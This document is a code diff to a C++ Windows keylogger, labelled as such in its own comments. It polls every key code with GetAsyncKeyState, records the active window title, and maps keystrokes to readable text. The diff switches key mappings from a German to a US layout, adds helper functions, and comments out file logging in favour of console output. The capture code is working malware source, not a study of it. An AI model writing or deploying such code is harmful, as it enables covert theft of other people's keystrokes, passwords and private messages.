@@ -1,8 +1,71 @@
 #include "stdafx.h"
 #include "main.h"
 
+#include <string>
+#include <windows.h>
+#include <stdlib.h>
+
+std::string intToString(int);
+std::string getSelfPath();
+std::string dirBasename(std::string);
+
 #define FILEEXT ".log"
 #define DEBUG
+#define DEBUG_TO_LOGS
+
+std::string intToString(int i) 
+{
+//#ifdef DEBUG
+	printf("Converting: %d to string.\n", i);
+//#endif
+	char buffer[4];
+	_itoa_s(i, buffer, 4, 10);
+	return std::string(buffer);
+}
+
+std::string getSelfPath() 
+{
+#ifdef DEBUG
+	printf("getSelfPath() ");
+#endif
+	char selfpath[MAX_PATH];
+	wchar_t selfpath_wchar[MAX_PATH];
+
+	GetModuleFileName(NULL, selfpath_wchar, MAX_PATH);
+	size_t pReturnValue;
+	wcstombs_s(&pReturnValue, selfpath, MAX_PATH, selfpath_wchar, MAX_PATH);
+
+	return std::string(selfpath);
+}
+
+std::string dirBasename(std::string path) 
+{
+#ifdef DEBUG
+	printf("dirBasename() ");
+#endif
+	if (path.empty())
+		return std::string("");
+
+	if (path.find("\\") == std::string::npos)
+		return path;
+
+	if (path.substr(path.length() - 1) == "\\")
+		path = path.substr(0, path.length() - 1);
+
+	size_t pos = path.find_last_of("\\");
+	if (pos != std::string::npos)
+		path = path.substr(0, pos);
+
+	if (path.substr(path.length() - 1) == "\\")
+		path = path.substr(0, path.length() - 1);
+
+	return path;
+}
+
+
+
+
+
 
 int main(int argc, char *argv[])
 {	
@@ -23,18 +86,25 @@ int main(int argc, char *argv[])
 
 	
 	std::string lastTitle = "";
-	std::ofstream file_logs(filepath);
+	//std::ofstream file_logs(filepath);
 	
 	//SHORT lastc = 0;
 	while(1)
 	{
-		Sleep(2); // give other programs time to run
+		Sleep(10); // give other programs time to run
 		
+#ifdef DEBUG_TO_LOGS
+		//printf("Geting title of the window.\n");
+#endif
 		// get the active windowtitle
 		char title[1024];
 		wchar_t title_wchar[1024];
 		HWND hwndHandle = GetForegroundWindow();
 		GetWindowText(hwndHandle, title_wchar, 1023);
+
+#ifdef DEBUG_TO_LOGS
+		// save window name
+#endif
 
 		size_t pReturnValue;
 		wcstombs_s(&pReturnValue, title, MAX_PATH, title_wchar, MAX_PATH);
@@ -42,25 +112,25 @@ int main(int argc, char *argv[])
 
 		if(lastTitle != title)
 		{
-			file_logs << std::endl << std::endl << "Window: ";
+			//file_logs << std::endl << std::endl << "Window: ";
 #ifdef DEBUG
 			std::cout << std::endl << std::endl << "Window: ";
 #endif
 			if(strlen(title) == 0)
 			{
-				file_logs << "NO ACTIVE WINDOW";
+				//file_logs << "NO ACTIVE WINDOW";
 #ifdef DEBUG
 				std::cout << "NO ACTIVE WINDOW";
 #endif
 			}
 			else
 			{
-				file_logs << "'" << title << "'";
+				//file_logs << "'" << title << "'";
 #ifdef DEBUG
 				std::cout << "'" << title << "'";
 #endif
 			}
-			file_logs << std::endl;
+			//file_logs << std::endl;
 #ifdef DEBUG
 			std::cout << std::endl;
 #endif
@@ -70,8 +140,14 @@ int main(int argc, char *argv[])
 		// logging keys, thats the keylogger
 		for (unsigned char c = 1; c < 255; c++)
 		{
-			SHORT rv = GetAsyncKeyState(c);
-			if (rv & 1)
+#ifdef DEBUG_TO_LOGS
+			//printf("Calling GetAsyncKeyState()", filepath);
+#endif // DEBUG
+			SHORT return_value = GetAsyncKeyState(c);
+#ifdef DEBUG_TO_LOGS
+			//printf("GetAsyncKeyState() returned: %d", return_value);
+#endif // DEBUG
+			if (return_value & 1)
 			{ // on press button down
 				std::string out = "";
 				if (c == 1)
@@ -86,8 +162,10 @@ int main(int argc, char *argv[])
 					out = "";
 				else if (c == 160 || c == 161) // lastc == 16
 					out = "[SHIFT]";
-				else if (c == 162 || c == 163) // lastc == 17
-					out = "[STRG]";
+				else if (c == 162) // lastc == 17
+					out = "[LEFT CTRL]";
+				else if (c == 163) // lastc == 17
+					out = "[RIGHT CTRL]";
 				else if (c == 164) // lastc == 18
 					out = "[ALT]";
 				else if (c == 165)
@@ -96,6 +174,8 @@ int main(int argc, char *argv[])
 					out = "[BACKSPACE]";
 				else if (c == 9)
 					out = "[TAB]";
+				else if (c == 20)
+					out = "[CAPS LOCK]";
 				else if (c == 27)
 					out = "[ESC]";
 				else if (c == 33)
@@ -120,7 +200,7 @@ int main(int argc, char *argv[])
 					out = "[DEL]";
 				else if ((c >= 65 && c <= 90)
 					|| (c >= 48 && c <= 57)
-					|| c == 32)
+					|| c == 32) // letters and numbers
 					out = c;
 
 				else if (c == 91 || c == 92)
@@ -142,9 +222,9 @@ int main(int argc, char *argv[])
 				else if (c == 192)
 					out = "[OE]";
 				else if (c == 222)
-					out = "[AE]";
+					out = "'";
 				else if (c == 186)
-					out = "[UE]";
+					out = ";";
 				else if (c == 186)
 					out = "+";
 				else if (c == 188)
@@ -154,19 +234,24 @@ int main(int argc, char *argv[])
 				else if (c == 190)
 					out = ".";
 				else if (c == 191)
-					out = "#";
+					out = "/";
+				else if (c == 219)
+					out = "[";
+				else if (c == 220)
+					out = "\\";
+				else if (c == 221)
+					out = "]";
 				else if (c == 226)
 					out = "<";
-
 				else
-					out = "[KEY \\" + intToString(c) + "]";
-				std::cout << "OUT = " << out << "\n";
+					out = intToString(c);
+				
 				
 #ifdef DEBUG
-				std::cout << ">" << out << "< (" << (unsigned)c << ")" << std::endl;
+				printf("Key = %s (%d)\n", out.c_str(), c);
 #endif
-				file_logs << out;
-				file_logs.flush();
+				//file_logs << out;
+				//file_logs.flush();
 				
 				//lastc = c;
 			}
@@ -174,7 +259,7 @@ int main(int argc, char *argv[])
 		
 	}
 	
-	file_logs.close();
+	//file_logs.close();
 	
 	return 0;
 }
